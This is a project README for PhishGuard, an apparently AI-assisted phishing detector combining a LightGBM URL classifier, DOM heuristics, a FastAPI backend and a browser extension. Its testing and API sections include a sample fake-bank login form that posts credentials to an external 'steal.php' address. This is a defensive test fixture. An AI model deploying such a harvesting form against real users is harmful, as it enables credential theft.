# DISCLAIMER
This was a project I did made entirely with the help of AI as a side project

# PhishGuard: Real-Time DOM & URL Phishing Detection Engine

[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.100%2B-009688.svg?logo=fastapi)](https://fastapi.tiangolo.com/)
[![LightGBM](https://img.shields.io/badge/LightGBM-Classifier-orange.svg)](https://lightgbm.readthedocs.io/)
[![Manifest V3](https://img.shields.io/badge/Chrome_Extension-Manifest_V3-green.svg)](https://developer.chrome.com/docs/extensions/mv3/)

**PhishGuard** is an advanced, real-time cybersecurity defense system designed to catch zero-day phishing attacks. Unlike traditional blacklist-based filters that fail against newly registered domains, PhishGuard combines **lexical URL feature analysis**, **live Document Object Model (DOM) inspection**, and an optimized **LightGBM machine learning classifier** trained on the official UC Irvine (UCI) **PhiUSIIL Phishing URL Dataset**.

The system operates across a modular architecture: an asynchronous Python feature parser, a gradient-boosted ML inference engine, a high-performance **FastAPI** backend, and a client-side **Manifest V3 browser extension** that injects real-time security telemetry directly into web pages.

---

## 🚀 Key Features

* **Hybrid Detection Model:** Fuses statistical machine learning ($99.90\%$ test accuracy) with deterministic DOM heuristic rules to eliminate false negatives caused by short URLs or obfuscated login forms.
* **Deep DOM Inspector:** Programmatically analyzes live webpage structures using `BeautifulSoup` to flag credential harvesting signatures, including:
  * Password input fields (`<input type="password">`) served over unencrypted HTTP.
  * Form action hijacking (forms submitting data to external IP addresses or third-party domains).
  * High ratios of external hyperlinks pointing away from the target root domain.
* **Smart Public Suffix Handling:** Integrates `tldextract` to accurately parse complex multi-part country-code second-level domains (e.g., `.co.uk`, `.ac.in`) and prevent false positives.
* **Real-Time Browser Overlay:** Automatically intercepts page rendering in Chromium-based browsers (Brave, Chrome, Edge) to display a 3-tier risk verdict (**SAFE**, **SUSPICIOUS**, or **PHISHING**) with human-readable explanations.

---

## 🏗️ System Architecture

```text
+-------------------------------------------------------------+
|               Browser Extension (Manifest V3)               |
|   (content.js grabs window.location.href & document.HTML)   |
+------------------------------+------------------------------+
                               | HTTP POST /analyze
                               v
+-------------------------------------------------------------+
|                FastAPI Backend (main.py)                    |
+------------------------------+------------------------------+
                               |
         +---------------------+---------------------+
         |                                           |
         v                                           v
+------------------------+                 +------------------------+
|   Feature Extraction   |                 | Live DOM Heuristics    |
|   - URL Lexical Stats  |                 | - Form Action Audit    |
|   - DOM Tag Parsing    |                 | - HTTP Password Check  |
+------------------------+                 +------------------------+
         |                                           |
         +---------------------+---------------------+
                               |
                               v
+-------------------------------------------------------------+
|             LightGBM Inference Engine (model.pkl)           |
|         (Outputs Final Risk Score & 3-Tier Verdict)         |
+-------------------------------------------------------------+
```

---

## 📁 Project Directory Structure

```text
phishing-dom-classifier/
├── backend/
│   ├── __init__.py         # Package initialization
│   ├── extractor.py        # Core 14-feature URL and DOM parser
│   ├── main.py             # FastAPI REST server & heuristic layer
│   └── model.pkl           # Pre-trained LightGBM model binary
├── extension/
│   ├── manifest.json       # Manifest V3 extension configuration
│   └── content.js          # DOM interceptor & UI alert renderer
├── notebooks/              # (Optional) Experimental notebooks
├── train_model.py          # Script to fetch PhiUSIIL dataset and train LightGBM
├── test_runner.py          # Standalone parser test script
└── README.md               # Project documentation
```

---

## ⚙️ Installation & Setup Guide

### Prerequisites
* Python `3.8` or higher
* A modern Chromium-based browser (Brave, Google Chrome, or Microsoft Edge)

### 1. Clone & Setup Virtual Environment
Open your terminal and run the following commands:

```bash
git clone https://github.com/your-username/phishing-dom-classifier.git
cd phishing-dom-classifier

# Create and activate a Python virtual environment
python -m venv venv
source venv/bin/activate  # On Windows use: venv\Scripts\activate
```

### 2. Install Dependencies
Install all required libraries for data science, parsing, and API hosting:

```bash
pip install beautifulsoup4 tldextract scikit-learn lightgbm pandas joblib fastapi uvicorn ucimlrepo
```

---

## 🧠 Training the Machine Learning Model

PhishGuard trains directly on the **PhiUSIIL Phishing URL Dataset** (UCI Repository ID: `967`), containing over 235,000 verified URLs and DOM structures.

Run the training script to fetch the dataset, train the LightGBM classifier, and export the binary to `backend/model.pkl`:

```bash
python train_model.py
```

**Expected Training Output:**
```text
[1/4] Fetching PhiUSIIL Phishing Dataset from UCI Repository (ID: 967)...
      Loaded 235,795 rows | Phishing (1): 100,945 | Benign (0): 134,850
[2/4] Splitting data into train (80%) and test (20%) sets...
[3/4] Training LightGBM model...
[4/4] Evaluating model performance on unseen test data...

=== CLASSIFICATION REPORT ===
              precision    recall  f1-score   support

   Benign (0)     0.9990    0.9992    0.9991     26970
Phishing (1)     0.9990    0.9987    0.9988     20189

    accuracy                         0.9990     47159
   macro avg     0.9990    0.9990    0.9990     47159
weighted avg     0.9990    0.9990    0.9990     47159

ROC-AUC Score: 1.0000

=== CONFUSION MATRIX ===
True Negatives (Safe marked Safe):        26,949
False Positives (Safe marked Phishing):   21
False Negatives (Phish marked Safe):      26
True Positives (Phish marked Phishing):   20,163

[SUCCESS] Model saved to backend/model.pkl
```

---

## 🚀 Running the FastAPI Backend

Start the Uvicorn ASGI server with live reload enabled:

```bash
uvicorn backend.main:app --reload
```

* The API will be active at: `http://127.0.0.1:8000`
* Interactive API Documentation (Swagger UI): **`http://127.0.0.1:8000/docs`**

---

## 🔌 Installing the Browser Extension

1. Open your browser (Brave / Chrome / Edge) and navigate to **`brave://extensions`** or **`chrome://extensions`**.
2. Enable **Developer mode** using the toggle switch in the top-right corner.
3. Click the **Load unpacked** button in the top-left corner.
4. Select the **`phishing-dom-classifier/extension`** folder.
5. Ensure local network shields (such as Brave Shields) are set to **Down** for local testing origins (`127.0.0.1` / `localhost`).

---

## 🧪 Testing the System Locally

To test your full pipeline against a simulated phishing credential harvester:

1. Create a test file named `fake_bank_test.html` in your root directory:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>Secure Login Portal</title></head>
   <body>
     <h2>Verify Your Account</h2>
     <form action="http://185.22.11.9/steal.php" method="POST">
       Username: <input type="text" name="user"><br>
       Password: <input type="password" name="pass"><br>
       <button type="submit">Sign In</button>
     </form>
   </body>
   </html>
   ```
2. Start a local static server in a second terminal:
   ```bash
   python -m http.server 9000
   ```
3. Navigate to **`http://localhost:9000/fake_bank_test.html`** in your browser. The red **PhishGuard Alert** banner will immediately render at the top of the page with a $100\%$ risk score.

---

## 🛡️ API Reference (`POST /analyze`)

**Request Body (`application/json`):**
```json
{
  "url": "http://sbi-kyc-update.top/login.php",
  "html": "<html><head><title>Login</title></head><body><form action='http://1.2.3.4/post'><input type='password'></form></body></html>"
}
```

**Response Body:**
```json
{
  "url": "http://sbi-kyc-update.top/login.php",
  "verdict": "PHISHING",
  "risk_score": 100.0,
  "ml_probability": 0.9821,
  "reasons": [
    "Insecure password input field over unencrypted HTTP",
    "Form hijacks data to an external host (1.2.3.4)"
  ],
  "features": {
    "URLLength": 35,
    "DomainLength": 19,
    "IsDomainIP": 0,
    "NoOfSubDomain": 1,
    "NoOfLettersInURL": 26,
    "NoOfDegitsInURL": 0,
    "DegitRatioInURL": 0.0,
    "IsHTTPS": 0,
    "HasTitle": 1,
    "HasSubmitButton": 1,
    "HasHiddenFields": 0,
    "HasPasswordField": 1,
    "NoOfiFrame": 0,
    "NoOfExternalRef": 0
  }
}
```

---

## 📜 License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
